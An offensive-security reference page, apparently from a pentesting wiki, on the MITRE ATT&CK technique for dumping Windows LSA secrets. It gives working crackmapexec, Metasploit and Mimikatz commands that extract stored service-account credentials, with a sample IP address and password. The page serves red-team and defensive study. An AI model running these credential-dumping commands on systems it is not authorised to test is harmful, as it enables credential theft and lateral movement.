---
description: https://attack.mitre.org/techniques/T1003/004/
---

# LSA Secrets

**ATT\&CK ID:** [T1003.004](https://attack.mitre.org/techniques/T1003/004/)

**Permissions Required:** <mark style="color:red;">**SYSTEM**</mark>

**Description**

Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets`. LSA secrets can also be dumped from memory.

## Techniques

### Crackmapexec

```bash
crackmapexec smb '10.10.10.100' -u 'moe' -p 'Password123' --lsa
```

![](<../../../../.gitbook/assets/image (464).png>)

### Metasploit

```
use post/windows/gather/lsa_secrets
```

![](<../../../../.gitbook/assets/image (262).png>)

### Mimikatz

```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
```

![](../../../../.gitbook/assets/Mimikatz-lsa-dumpsecrets.png)
